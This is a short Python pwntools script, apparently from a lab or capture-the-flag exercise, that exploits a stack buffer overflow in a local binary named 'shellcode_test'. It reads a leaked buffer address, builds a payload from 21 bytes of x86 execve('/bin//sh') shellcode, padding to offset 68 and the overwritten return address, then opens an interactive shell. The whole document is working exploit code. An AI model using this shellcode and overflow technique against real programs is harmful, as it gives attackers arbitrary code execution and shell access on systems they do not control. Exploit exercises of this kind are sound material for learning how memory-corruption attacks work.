from pwn import *
import struct

p = process('./shellcode_test')
print("process:", p)

output = p.recvuntil("Buffer ada di: ")

buffer = p.recvline()
print("buffer: ", buffer)

buffer = int(buffer,16)
print("buffer: ", buffer)

buff_byte = struct.pack("<I", buffer)
print("buff_byte: ", buff_byte)

offset = 68
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
sc_len = len(shellcode)
print("shellcode", disasm(shellcode))


payload = shellcode + "A" * (offset - sc_len) + buff_byte

print payload

p.sendline(payload + '\n')

p.interactive()
